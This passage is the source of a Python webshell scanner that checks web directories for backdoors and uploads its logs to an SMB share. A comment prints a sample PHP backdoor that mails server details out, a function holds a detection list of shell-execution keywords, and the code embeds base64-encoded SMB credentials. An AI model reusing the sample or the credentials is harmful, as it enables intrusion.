# -----------------------------------------------------------------------------------------------------------
# IMPORT
# -----------------------------------------------------------------------------------------------------------

import base64
import configparser
import datetime
import getpass
import gzip
import hashlib
import json
import math
import os
import platform
import re
import socket
import sys
import threading
import time
import zipfile
from collections import Counter
from zipfile import ZipFile

import psutil
import requests
from smb.SMBConnection import SMBConnection

if platform.system() == "Linux":
    try:
        import termios
        import tty
    except ImportError:
        print("Missing modules termios or tty.")
        exit()

# -----------------------------------------------------------------------------------------------------------
# FUNCTION
# -----------------------------------------------------------------------------------------------------------


def PressAnyKey():
    if platform.system() == "Windows":
        os.system('pause')
    elif platform.system() == "Linux":
        print(getchr("Press any key to continue . . ."))


def getchr(prompt=''):
    sys.stdout.write(prompt)
    sys.stdout.flush()
    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    try:
        tty.setraw(fd)
        return sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)


def GetAllFiles(dir_list, size, ext):
    i = 0
    scan_dir = []
    # Default web directory
    windows_list = ["C:\\xampp\\htdocs",
                    "C:\\inetpub\\wwwroot", "C:\\Apache24\\htdocs"]
    linux_list = ["/var/www/html", "/var/http/", "/srv/http/", "/etc/apache2/", "/etc/nginx/", "/etc/httpd/",
                  "/usr/local/apache2", "/webapps/ROOT/", "/applications/DefaultWebApp/", "/opt/lampp/httpdocs/"]
    if platform.system() == "Windows":
        dir_list = dir_list + windows_list
    elif platform.system() == "Linux":
        dir_list = dir_list + linux_list
    else:
        print("Unsupported OS. Exit")
        PressAnyKey()
        exit()

    for dir_path in dir_list:
        if os.path.isdir(dir_path):
            i = i + 1
            scan_dir.append(dir_path)
    file_list = [[] for j in range(i)]
    i = 0

    ext_list = ext.split("|")
    for dir_path in dir_list:
        if os.path.isdir(dir_path):
            for root, dirs, files in os.walk(dir_path):
                for file in files:
                    try:
                        file_size = os.path.getsize(root + "/" + file)
                    except:
                        continue
                    if file_size > size:
                        continue
                    for e in ext_list:
                        if e in file:
                            # append the file name to the list
                            file_list[i].append(os.path.join(root, file))
                            break
            i = i + 1
    file_list_all = []
    if file_list == []:
        print("Incorrect scan directory. Check [config].dir in config.conf")
        PressAnyKey()
        exit()
    for i in range(len(file_list)):
        file_list_all = file_list_all + file_list[i]
    return file_list, file_list_all, scan_dir


def ScanDoubleExtension(file_name):
    # Input Sample
    # file_name = "Ajan.asp.txt"

    file_matches = {}
    r1 = re.compile("[^a-zA-Z0-9\-\_\.]{2,}")
    r2 = re.compile("\.[a-zA-Z0-9]{2,4}\.")
    r3 = re.compile(
        "\.php|\.asp|\.aspx|\.sh|\.bash|\.zsh|\.csh|\.tsch|\.pl|\.py|\.cgi|\.cfm|\.jsp|\.htaccess|\.ashx|\.vbs")
    matches = re.findall(r1, file_name)
    if len(matches) > 0:
        count_dict = dict(Counter(matches).items())
        file_matches.update(count_dict)
    matches = re.findall(r2, file_name)
    if len(matches) > 0:
        for i in matches:
            matches_t = re.findall(r3, i)
            if len(matches_t) > 0:
                count_dict = dict(Counter(matches).items())
                file_matches.update(count_dict)
    return file_matches


def StringMatches(file_data):
    # Input Sample
    # file_data = "<?php include(\"config.php\");db_connect();header('Content-Type: application/octetstream');header('Content-Disposition: filename=\"linksbox_v2.sql\"');$ra44 = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$sd98=\"john.barker446@gmail.com\";$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = \"$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65\";mail($sd98, $sj98, $msg8873, \"From: $sd98\"); header('Pragma: no-cache');header('Expires: 0'); $data .= \"#phpMyAdmin MySQL-Dump \r\n\"; $data .=\"# http://phpwizard.net/phpMyAdmin/ \r\n\"; $data .=\"# http://www.phpmyadmin.net/(download page) \r\n\"; $data .= \"#$database v2.0 Database Backup\r\n\"; $data .= \"#Host: $server\r\n\"; $data .= \"#Database: $database\r\n\r\n\"; $data .= \"#Table add_links:\r\n\";$result = mysql_query(\"SELECT * FROM add_links\");while($a = mysql_fetch_array($result)) { foreach($a as $key => $value) { $a[$key] = addslashes($a[$key]); } $data .= \"INSERT INTO add_links VALUES('0','$a[link]', '$a[description]', '$a[tooltip]', '$a[hits]'); \r\n#endquery\r\n\"; } echo $data; ?>"

    file_matches = {}
    r = re.compile(regex)
    matches = re.findall(r, file_data)
    if len(matches) > 0:
        count_dict = dict(Counter(matches).items())
        file_matches.update(count_dict)
    return file_matches


def EntropyMatches(file_data):
    # Input Sample
    # file_h = open("test_entropy.txt", "r")
    # file_data = file_h.read()

    file_matches = {}
    entropy = 0.0
    file_data = file_data.replace(" ", "")
    for i in range(256):  # Scan all 256 character in ASCII
        count = float(file_data.count(chr(i)))
        length = float(len(file_data))
        try:
            pX = count / length
        except ZeroDivisionError:
            return file_matches, entropy
        if pX > 0.00:
            entropy = entropy + (-pX * math.log(pX, 2))
    if entropy > 6:
        file_matches["Entropy"] = int(entropy*10)
    if len(file_data) < 20*1024:
        file_matches = {}
        return file_matches, entropy
    return file_matches, entropy

# TESTED AND WORKED, BUT NOT SURE


def CompressMatches(file_data):
    file_matches = {}
    if len(file_data) < 20*1024:
        return file_matches
    compressed = gzip.compress(bytes(file_data, 'utf-8'))
    raw = gzip.decompress(compressed)
    ratio = len(compressed) / len(raw)
    if ratio > 0.74:
        file_matches["Compress"] = int(ratio * 100)
    return file_matches


def SplitMatches(file_data):
    # file_h = open("customer-new-account.php", "r")
    # file_data = file_h.read()

    file_matches = {}
    s = "eval|file_put_contents|base64_decode|base64|python_eval|exec|passthru|popen|proc_open|pcntl|assert|system|shell|uncompress|cmd.exe|execute|escapeshellcmd|os.popen|/bin/sh|/bin/bash|create_function|executionpolicybypass"
    split_list = s.split("|")
    result = "|"
    for i in split_list:
        result = result + i[::-1] + "|"
    result = result[:-1]
    reg = s + result
    reg = reg.replace("_", r"\_")
    reg = reg.replace(".", r"\.")
    reg = reg.replace("/", r"\/")
    r = re.compile(reg)
    r1 = re.compile(r"(?:\'[^\']*\')|(?:\"[^\"]*\")")
    r2 = re.compile(r"[^\w\/\.\_]")
    matches1 = re.findall(r1, file_data)
    s1 = ""
    if len(matches1) > 0:
        for i in matches1:
            s1 = s1 + i
    s1 = re.sub(pattern=r2, string=s1, repl="")
    matchesr1 = re.findall(r, s1.lower())
    if len(matchesr1) > 0:
        count_dict = dict(Counter(matchesr1).items())
        file_matches.update(count_dict)
    return file_matches


def Base64Matches(file_data):
    # Correct Input Sample
    # file_h = open("test_base64.txt", "r")
    # file_data = file_h.read()

    file_matches = {}
    r3 = re.compile(r"(?:\'[^\']*\')|(?:\"[^\"]*\")")
    r4 = re.compile(r"[^\w\/=+]")
    matches1 = re.findall(r3, file_data)
    s1 = ""
    if len(matches1) > 0:
        for it in matches1:
            s1 = re.sub(pattern=r4, string=it, repl="")
            r = re.compile(
                "^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$")
            r1 = re.compile("[a-fA-F0-9]+")
            r2 = re.compile("[a-zA-Z0-9\/]+")
            matches = re.findall(r, s1)
            if len(matches) > 0:
                for it1 in matches:
                    matchesit1 = re.findall(r1, it1)
                    for k in matchesit1:
                        if len(k) == len(it1)-2:
                            continue
                    matchesit1 = re.findall(r2, it1)
                    for k in matchesit1:
                        if len(k) == len(it1)-2:
                            continue
                    if it1 != "":
                        file_matches[it1] = len(it1)
    return file_matches


def Base32Matches(file_data):
    file_matches = {}
    r3 = re.compile(r"(?:\'[^\']*\')|(?:\"[^\"]*\")")
    r4 = re.compile(r"[^\w\/=+]")
    matches1 = re.findall(r3, file_data)
    s1 = ""
    if len(matches1) > 0:
        for it in matches1:
            s1 = re.sub(pattern=r4, string=it, repl="")
            r = re.compile(
                "^(?:[A-Z2-7]{8})*(?:[A-Z2-7]{2}={6}|[A-Z2-7]{4}={4}|[A-Z2-7]{5}={3}|[A-Z2-7]{7}=)?$")
            r1 = re.compile("[a-fA-F0-9]+")
            r2 = re.compile("[a-zA-Z0-9\/]+")
            matches = re.findall(r, s1)
            if len(matches) > 0:
                for it1 in matches:
                    matchesit1 = re.findall(r1, it1)
                    for k in matchesit1:
                        if len(k) == len(it1)-2:
                            continue
                    matchesit1 = re.findall(r2, it1)
                    for k in matchesit1:
                        if len(k) == len(it1)-2:
                            continue
                    if it1 != "":
                        file_matches[it1] = len(it1)
    return file_matches


def HexStringMatches(file_data):
    file_matches = {}
    r = re.compile(r"(?:(?:\\x[0-9A-Fa-f]{2})+)")
    matches = re.findall(r, file_data)
    if len(matches) > 0:
        count_dict = dict(Counter(matches).items())
        file_matches.update(count_dict)
    return file_matches


def LongStringMatches(file_data):
    file_matches = {}
    if len(file_data) < 20*1024:
        return file_matches
    r = re.compile("(?:\'[^\']*\')|(?:\"[^\"]*\")")
    r1 = re.compile("[a-zA-Z0-9\+\/\=]")
    matches = re.findall(r, file_data)
    matches_result = []
    if len(matches) > 0:
        for it in matches:
            if len(it) < 64:
                continue
            matchesx = re.findall(r1, it)
            for x in matchesx:
                if len(x) == len(it)-2:
                    continue
            matches_result.append(it)
        count_dict = dict(Counter(matches_result).items())
        file_matches.update(count_dict)
    return file_matches


def ObfuscatedMatches(file_data):
    file_matches = {}
    r1 = re.compile(r"str_replace")
    matches = re.findall(r1, file_data)
    count_dict = dict(Counter(matches).items())
    file_matches.update(count_dict)
    return file_matches


def CustomMatches(file_data):
    file_matches = {}
    lock.acquire()
    custom_matches_handle = open("database.db", "rb")
    custom_matches_string = custom_matches_handle.read()
    custom_matches_string = base64.b64decode(custom_matches_string).decode()
    custom_matches = json.loads(custom_matches_string)
    custom_matches = custom_matches.get("rules")
    custom_matches_handle.close()
    lock.release()
    if custom_matches == "" or custom_matches == None:
        return file_matches
    r = [None] * len(custom_matches)
    regex_list = list(custom_matches.values())
    for i in range(len(regex_list)):
        try:
            r[i] = re.compile(regex_list[i])
        except:
            return file_matches
    for i in r:
        matches = re.findall(i, file_data)
        if len(matches) > 0:
            count_dict = dict(Counter(matches).items())
            file_matches.update(count_dict)
    return file_matches


def CompressEncode(file, size):
    # Input Sample
    # file = "C:\\Users\\namlh21\\Downloads\\webshell-master\\138shell\\C\\ctt_sh.php.txt"

    file_handle = open(file, "rb")
    file_data = file_handle.read()
    compressed = gzip.compress(bytes(file_data))
    img_base64 = base64.b64encode(compressed)
    return img_base64


def ProcessMatches(file):
    # Input Sample
    # file = "C:\\Users\\namlh21\\Downloads\\webshell-master\\138shell\\C\\ctt_sh.php.txt"

    total_file_matches = {}
    file_matches = {}
    scan_info = ""
    count = 0

    try:
        file_handle = open(file)
        file_data = file_handle.read()
    except:
        try:
            file_handle = open(file, "rb")
            file_data = file_handle.read()
        except:
            return total_file_matches, 0, "", 0
    file_size = os.stat(file).st_size
    file_name = os.path.basename(file)

    file_matches = ScanDoubleExtension(file_name)

    # Extension Matches
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + "TRUE"
        count = count + 1
    scan_info = scan_info + ","

    if isinstance(file_data, str) == False:
        file_data = str(file_data)

    # CONFUSED HERE!!!!!!!!!!!
    # cmtR = "\/\/.*|\/\*.*?\*\/|[^\u0000-\u007f]+" # RANGE OF UNICODE IN PYTHON ONLY HAVE 1 \, NOT 2
    cmtR = "[^\u0000-\u007f]+"  # TEMPORARY REGEX.

    matches = re.findall(pattern=cmtR, string=file_data)
    file_data = re.sub(pattern=cmtR, string=file_data, repl="")
    cmtR = re.compile(r"[\s\n\r\t]+")
    matches = re.findall(pattern=cmtR, string=file_data)
    file_data = re.sub(pattern=cmtR, string=file_data, repl=" ")
    file_data = file_data.replace("  ", " ")
    file_data = file_data.replace(" (", "(")

    # VERY IMPORTANT REGEX
    # codeR = re.compile(
    # r"<\?php(?:.*)\?>|<\?PHP(?:.*)\?>|<script(?:.*)<\/script>|<SCRIPT(?:.*)<\/SCRIPT>|<\?eval(?:.*)\?>|<\?\s+eval(?:.*)\?>|<%(?:.*)|<\?(?:.*)")
    codeR = re.compile(
        r"<\?php(?:.*)\?>|<\?PHP(?:.*)\?>|<script(?:.*)<\/script>|<SCRIPT(?:.*)<\/SCRIPT>|<%(?:.*)%>|<\?(?:.*)\?>")
    matches = re.findall(pattern=codeR, string=file_data)
    if len(matches) > 0:
        file_data = ""
        for i in matches:
            file_data = file_data + i
    else:
        return total_file_matches, 0, "", 0

    # String Matches
    file_matches = StringMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    scan_info = scan_info + ","

    # Entropy Matches and Calculate Entropy
    file_matches, entropy = EntropyMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update({"Entropy": file_matches["Entropy"]})
        scan_info = scan_info + str(total_file_matches["Entropy"])
        count = count + 1
    scan_info = scan_info + ","

    # Compress Matches
    file_matches = CompressMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update({"Compress": file_matches["Compress"]})
        scan_info = scan_info + str(total_file_matches["Compress"])
        count = count + 1
    scan_info = scan_info + ","

    # Split Matches
    file_matches = SplitMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    scan_info = scan_info + ","

    # Base64 Matches
    file_matches = Base64Matches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    scan_info = scan_info + ","

    # Base32 Matches
    file_matches = Base32Matches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    scan_info = scan_info + ","

    # Hex String Matches
    file_matches = HexStringMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    scan_info = scan_info + ","

    # Long String Matches
    file_matches = LongStringMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    scan_info = scan_info + ","

    # Obfuscated Matches
    file_matches = ObfuscatedMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    scan_info = scan_info + ","

    # Custom Matches
    file_matches = CustomMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1

    match_log = file + "," + scan_info.replace(" ", "")
    if count > 0:
        return total_file_matches, file_size, match_log, entropy
    file_handle.close()
    return total_file_matches, file_size, "", entropy


def MD5HashFile(file):
    # Input Sample
    # file = "C:\\Users\\namlh21\\Downloads\\webshell-master\\138shell\\C\\ctt_sh.php.txt"

    file_handle = open(file, "rb")
    file_data = file_handle.read()
    result = hashlib.md5(file_data).hexdigest()
    return result


def SHA256HashFile(file):
    # Input Sample
    # file = "C:\\Users\\namlh21\\Downloads\\webshell-master\\138shell\\C\\ctt_sh.php.txt"

    file_handle = open(file, "rb")
    file_data = file_handle.read()
    result = hashlib.sha256(file_data).hexdigest()
    return result


def ScanFunc(scan_dir, file_list_all, output_dir, start_time, lock, db_content_json):
    global matched
    global cleared
    global total

    # Scan file-by-file in file list
    for file in file_list_all:
        if file == None:
            continue
        # Sample
        # file = "C:\Users\namlh21\Downloads\WebShell_2\Php\devilzShell.php"

        file_name = os.path.basename(file)

        # Hash of file
        file_md5 = MD5HashFile(file)
        file_sha256 = SHA256HashFile(file)

        # Process Matches
        file_matches, size, match_log, entropy = ProcessMatches(file)

        # CompressEncode
        raw = CompressEncode(file, size)

        # match_header = "PathName,Extension,String,Entropy,Compress,Split,Base64,Base32,HexString,LongString,Size,MD5,Created,Modified,Accessed\n"
        match_list = match_log.split(",")

        # When program add a new match, EDIT THIS NUM
        if len(match_list) != 12:
            match_list = [""] * 12

        # If can't open web db, load from local db
        if db_content_json == 0:
            lock.acquire(timeout=-1)
            db_handle = open(tool_path + "/database.db", "rb")
            db_content = db_handle.read()
            db_content = base64.b64decode(db_content).decode()
            db_content_json = json.loads(db_content)
            db_handle.close()
            lock.release()

        for i in range(len(scan_dir)):
            if scan_dir[i] in file:
                total[i] = total[i] + 1
        if file_sha256 in str(db_content_json['blacklist']):
            print(file + ": Already in database. Matched.")
            lock.acquire()
            for i in range(len(scan_dir)):
                if scan_dir[i] in file:
                    matched[i] = matched[i] + 1
            lock.release()
            continue
        elif file_sha256 in str(db_content_json['whitelist']):
            print(file + ": Already in database. Clean.")
            lock.acquire()
            for i in range(len(scan_dir)):
                if scan_dir[i] in file:
                    cleared[i] = cleared[i] + 1
            lock.release()
            continue

        # Only file not in db is wrote to database.db
        else:
            print(file)
            lock.acquire(timeout=-1)
            lock.release()
            if (len(file_matches) > 0 and size > 0):
                lock.acquire(timeout=-1)
                for i in range(len(scan_dir)):
                    if scan_dir[i] in file:
                        matched[i] = matched[i] + 1
                lock.release()

                lock.acquire(timeout=-1)
                db_handle = open(tool_path + "/database.db", "rb")
                db_string = db_handle.read()
                db_string = base64.b64decode(db_string).decode()
                db_json = json.loads(db_string)
                db_handle.close()
                blacklist = db_json['blacklist']
                blacklist.update({file_name: file_sha256})
                db_handle = open(tool_path + "/database.db", "wb")
                db_json_string = json.dumps(db_json, indent=4)
                db_json_string = base64.b64encode(db_json_string.encode())
                db_handle.write(db_json_string)
                db_handle.close()
                lock.release()

            else:
                lock.acquire(timeout=-1)
                for i in range(len(scan_dir)):
                    if scan_dir[i] in file:
                        cleared[i] = cleared[i] + 1
                lock.release()

                lock.acquire(timeout=-1)
                db_handle = open(tool_path + "/database.db", "rb")
                db_string = db_handle.read()
                db_string = base64.b64decode(db_string).decode()
                db_json = json.loads(db_string)
                db_handle.close()
                whitelist = db_json['whitelist']
                whitelist.update({file_name: file_sha256})
                db_handle = open(tool_path + "/database.db", "wb")
                db_json_string = json.dumps(db_json, indent=4)
                db_json_string = base64.b64encode(db_json_string.encode())
                db_handle.write(db_json_string)
                db_handle.close()
                lock.release()
                continue

        # Get created time
        if platform.system() == 'Windows':
            create_time = os.path.getctime(file)
            create_time = time.strftime(
                '%Y-%m-%d %H:%M:%S', time.localtime(create_time))
            modify_time = os.path.getmtime(file)
            modify_time = time.strftime(
                '%Y-%m-%d %H:%M:%S', time.localtime(modify_time))
            access_time = os.path.getatime(file)
            access_time = time.strftime(
                '%Y-%m-%d %H:%M:%S', time.localtime(access_time))
        else:
            stat = os.stat(file)
            create_time = stat.st_ctime  # We're probably on Linux.
            create_time = time.strftime(
                '%Y-%m-%d %H:%M:%S', time.localtime(create_time))
            modify_time = stat.st_mtime
            modify_time = time.strftime(
                '%Y-%m-%d %H:%M:%S', time.localtime(modify_time))
            access_time = stat.st_atime
            access_time = time.strftime(
                '%Y-%m-%d %H:%M:%S', time.localtime(access_time))

        # JSON output (ONLY MATCHED FILE INCLUDE ON LOG.JSON)
        json_data = {}
        json_data.update({"filePath": file})
        json_data.update({"size": str(size)})
        json_data.update({"md5": file_md5})
        json_data.update({"sha256": file_sha256})

        timestamps = {}
        timestamps.update({"created": create_time})
        timestamps.update({"modified": modify_time})
        timestamps.update({"accessed": access_time})
        json_data.update({"timestamps": timestamps})

        signature = {}
        signature.update({"extension": match_list[1]})
        signature.update({"string": match_list[2]})
        signature.update({"entropy": match_list[3]})
        signature.update({"compress": match_list[4]})
        signature.update({"split": match_list[5]})
        signature.update({"base64": match_list[6]})
        signature.update({"base32": match_list[7]})
        signature.update({"hexstring": match_list[8]})
        signature.update({"longstring": match_list[9]})
        signature.update({"obfuscated": match_list[10]})
        signature.update({"custom": match_list[11]})
        json_data.update({"signature": signature})

        json_data.update({"matches": file_matches})
        json_data.update({"entropy": entropy})
        json_data.update({"rawContents": str(raw)})
        json_data_string = json.dumps(json_data, indent=4)

        output_json_path = output_dir + "/log.json"
        lock.acquire(timeout=-1)
        output_json_handle = open(output_json_path, "a")
        output_json_handle.write(json_data_string + "\n")
        output_json_handle.close()
        lock.release()

    # Write scan debug info to debug.json
    stop_time = time.time()
    global total_scan_time
    total_scan_time = stop_time - start_time


def GetDebugInfo():
    global cpu_percent
    global mem_percent
    global mem_info

    sample_times = 10

    pid = os.getpid()
    process = psutil.Process(pid)
    cpu_percent_list = [0] * sample_times
    mem_percent_list = [0] * sample_times
    mem_info_list = [0] * sample_times

    for i in range(sample_times):
        cpu_percent_list[i] = process.cpu_percent(
            interval=0.5) / psutil.cpu_count()
        mem_percent_list[i] = process.memory_percent()
        mem_info_list[i] = process.memory_info()[0]/(1024*1024)
        time.sleep(1)

    cpu_percent = round(sum(cpu_percent_list) / len(cpu_percent_list), 6)
    mem_percent = round(sum(mem_percent_list) / len(mem_percent_list), 6)
    mem_info = round(sum(mem_info_list) / len(mem_info_list), 6)


def CreateMultiThread():
    t = [None] * i
    for j in range(len(splited_list)):
        t[j] = threading.Thread(target=ScanFunc, args=(
            scan_dir, splited_list[j], output_dir, start_time, lock, db_json))
    t[i-1] = threading.Thread(target=GetDebugInfo)
    for j in range(i):
        if t[j] != None:
            t[j].start()
    for j in range(i):
        if t[j] != None:
            t[j].join()


def WriteDebugInfo(total, matched, cleared, scan_dir, web_domain, scan_time, output_dir):
    global cpu_percent
    global mem_percent
    global mem_info

    hostname = socket.gethostname()
    user_name = getpass.getuser()
    homedir = os.path.expanduser("~")

    if len(scan_dir) > len(web_domain):
        while (len(scan_dir) > len(web_domain)):
            web_domain.append("default")

    scan_data = {}
    scan_info = []
    for i in range(len(scan_dir)):
        scan_info.append({})
    directory = []
    for i in range(len(scan_dir)):
        directory.append({})
    for i in range(len(scan_info)):
        scan_info[i].update({"dirPath": str(scan_dir[i])})
        if len(web_domain) == len(scan_dir):
            scan_info[i].update({"domain": str(web_domain[i])})
        scan_info[i].update({"scanned": str(total[i])})
        scan_info[i].update({"matches": str(matched[i])})
        scan_info[i].update({"noMatches": str(cleared[i])})
    for i in range(len(directory)):
        scan_data.update({"dir" + str(i+1): scan_info[i]})

    system_info = {}
    system_info.update({"cpuPercent": str(cpu_percent)})
    system_info.update({"memUsage": str(mem_info)})  # in KB
    system_info.update({"memPercent": str(mem_percent)})
    system_info.update({"hostname": str(hostname)})
    system_info.update({"username": user_name})
    system_info.update({"userHomeDir": homedir})
    scan_data.update({"systemInfo": system_info})

    scan_data.update({"scanDuration": str(scan_time)})
    scan_data_string = json.dumps(scan_data, indent=4)
    output_json_path = output_dir + "/debug.json"
    output_json_handle = open(output_json_path, "a")
    output_json_handle.write(scan_data_string + "\n")
    output_json_handle.close()


# Split a list into chunk_numbers list
def SplitList(lst, chunk_numbers):
    n = math.ceil(len(lst)/chunk_numbers)
    for x in range(0, len(lst), n):
        each_chunk = lst[x: n+x]
        if len(each_chunk) < n:
            each_chunk = each_chunk + [None for y in range(n-len(each_chunk))]
        yield each_chunk


def WindowsScheduler(run_hour):
    try:
        import win32com.client
    except ImportError:
        print('Missing pywin32 modules.')
        PressAnyKey()
        exit()

    # Get days_interval option
    parser = configparser.ConfigParser()
    parser.read(tool_path + "/config.conf")
    try:
        days_interval = parser.get("config", "days_interval")
    except:
        print(
            "No option 'days_interval'. Check [config].days_interval in config.conf")
        PressAnyKey()
        exit()

    # Check default config
    if days_interval == "":
        days_interval = "30"  # run every 30 days after

    # Check valid days_interval format
    if days_interval.isnumeric() == False:
        print(
            "'days_interval' is not in valid format. Check [config].days_interval in config.conf")
        PressAnyKey()
        exit()
    else:
        days_interval = int(days_interval)

    # Connect to Schedule Service
    scheduler = win32com.client.Dispatch('Schedule.Service')
    scheduler.Connect()
    root_folder = scheduler.GetFolder("\\")
    task_def = scheduler.NewTask(0)

    # Create trigger
    start_time = datetime.datetime.now()
    TASK_TRIGGER_TIME = 1
    trigger = task_def.Triggers.Create(TASK_TRIGGER_TIME)
    start_time = start_time.replace(
        hour=run_hour, minute=0, second=0, microsecond=0)
    trigger.StartBoundary = start_time.isoformat()
    repetitionPattern = trigger.Repetition
    repetitionPattern.Interval = "P" + str(days_interval) + "D"

    # Create action
    TASK_ACTION_EXEC = 0
    action = task_def.Actions.Create(TASK_ACTION_EXEC)
    action.ID = 'DO NOTHING'
    action.Path = tool_path + '\\webshell_scan.exe'

    # Set parameters
    TASK_RUNLEVEL_HIGHEST = 1
    TASK_LOGON_SERVICE_ACCOUNT = 5
    task_def.RegistrationInfo.Description = 'Webshell Scan Task'
    task_def.Settings.Enabled = True
    task_def.Settings.StartWhenAvailable = True
    task_def.Principal.RunLevel = TASK_RUNLEVEL_HIGHEST
    task_def.Principal.LogonType = TASK_LOGON_SERVICE_ACCOUNT

    # Register task. If task already exists, it will be updated
    TASK_CREATE_OR_UPDATE = 6
    TASK_LOGON_INTERACTIVE_TOKEN = 3
    try:
        root_folder.RegisterTaskDefinition(
            'Webshell Scan Task',  # Task name
            task_def,
            TASK_CREATE_OR_UPDATE,
            'SYSTEM',
            None,  # No password
            TASK_LOGON_INTERACTIVE_TOKEN)
    except:
        print("The program doesn't have enough privileges.")
        print("Check if you run program as administrator.")
        PressAnyKey()
        exit()


def LinuxScheduler(run_hour):
    try:
        import crontab
        from croniter import croniter
        from crontab import CronTab
    except ImportError:
        print('Missing crontab or croniter modules. Exit')
        PressAnyKey()
        exit()

    # Get crontab option
    parser = configparser.ConfigParser()
    parser.read(tool_path + "/config.conf")
    try:
        crontab = parser.get("config", "crontab")
    except:
        print("No option 'crontab'. Check [config].crontab in config.conf")
        PressAnyKey()
        exit()

    # Check default config
    if crontab == "":
        # every first day of month, at run_hour:00.
        crontab = "0 " + str(run_hour) + " 1 * *"

    # Check valid crontab
    valid = croniter.is_valid(crontab)
    if valid == False:
        print(
            "'crontab' is not in valid format. Check [config].crontab in config.conf")
        PressAnyKey()
        exit()

    # Write crontab
    user_name = getpass.getuser()
    cron = CronTab(user=user_name)
    is_written = 0
    for job in cron:
        if job.comment == "webshell scan":
            job.setall(crontab)
            job.command = tool_path + "/webshell_scan"
            is_written = 1
            cron.write()
            break
    if is_written == 0:
        job = cron.new(command=tool_path + "/webshell_scan",
                       comment="webshell scan")
        job.setall(crontab)
        cron.write()


def TestDatabase():
    db_path = "http://dnsblock.vingroup.net/fiqTwebshellconfigkXZC"
    try:
        r = requests.get(db_path)
        if r.status_code == 200:
            print("Database opened: " + db_path)
            db_json = base64.b64decode(r.content).decode()
            db_json = json.loads(db_json)
            blacklist = db_json["blacklist"]
            whitelist = db_json["whitelist"]
            rules = db_json["rules"]
    except:
        print("Cannot open web scanned database.")
        db_json = 0
    # If can't get web db, open or create local db
    try:
        print("Finding local database...")
        db_handle = open(tool_path + "/database.db", "rb")
        db_json_string = db_handle.read()
        db_json_string = base64.b64decode(db_json_string).decode()
        db_json_local = json.loads(db_json_string)
        blacklist = db_json_local["blacklist"]
        whitelist = db_json_local["whitelist"]
        rules = db_json_local["rules"]
        db_handle.close()
    except:
        print("Created new local database")
        db_handle = open(tool_path + "/database.db", "ab")
        # Define new json db
        db_json_local = {}
        blacklist = {}
        whitelist = {}
        rules = {}
        db_json_local.update({"blacklist": blacklist})
        db_json_local.update({"whitelist": whitelist})
        db_json_local.update({"rules": rules})
        db_json_string = json.dumps(db_json_local, indent=4)
        db_json_string = base64.b64encode(db_json_string.encode())
        db_handle.write(db_json_string)
        db_handle.close()
    return db_json


def ZipOutput():
    with ZipFile(output_dir + "/" + output_zip, 'w', compression=zipfile.ZIP_DEFLATED) as zip:
        if os.path.isfile(output_dir + "/log.json"):
            zip.write(output_dir + "/log.json",
                      os.path.basename(output_dir + "/log.json"))
        zip.write(output_dir + "/debug.json",
                  os.path.basename(output_dir + "/debug.json"))


def SaveToLogServer():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)

    share_name = "Logs$"

    user_name = base64.b64decode("c29jX2h1bnRpbmc=").decode()
    password = base64.b64decode("ZWFyY2hEdW1wc3RAMQ==").decode()
    local_machine_name = socket.gethostbyaddr(local_ip)[0]
    server_machine_name = "s-dc1-azure-bk.vingroup.local"      # MUST match correctly
    server_IP = "10.111.177.41"        # also MUST this

    conn = SMBConnection(user_name, password, local_machine_name, server_machine_name,
                         is_direct_tcp=True, use_ntlm_v2=True, domain="VINGROUP")

    try:
        conn.connect(server_IP, port=445)
        zip_file = open(output_dir + "/" + output_zip, 'rb')
        conn.storeFile(share_name, "/" + output_zip, zip_file)
        zip_file.close()
        os.remove(output_dir + "/" + output_zip)
        print("Log .zip file saved in: smb://" +
              server_IP + "/" + share_name + "/" + output_zip)
    except:
        print("Log .zip file store in local.")


def DeleteTempFile():
    if os.path.exists(output_dir):
        for root, dirs, files in os.walk(output_dir):
            for file in files:
                os.remove(os.path.join(output_dir, file))
            for dir in dirs:
                os.rmdir(os.path.join(output_dir, dir))
    os.rmdir(output_dir)
    print("Cleaned all temp file.")

# -----------------------------------------------------------------------------------------------------------
# MAIN PROGRAM
# -----------------------------------------------------------------------------------------------------------


# Global variables
total_scan_time = 0
cpu_percent = 0
mem_percent = 0
mem_info = 0
run_hour = 22  # The program will run at this hour

# Main program
start_time = time.time()
print("Webshell Scan Program")

# Assign tool_path
if platform.system() == "Windows":
    tool_path = os.path.dirname(sys.argv[0])
elif platform.system() == "Linux":
    tool_path = os.path.abspath(os.path.dirname(sys.argv[0]))

# Open config.conf file
try:
    if platform.system() == "Linux":
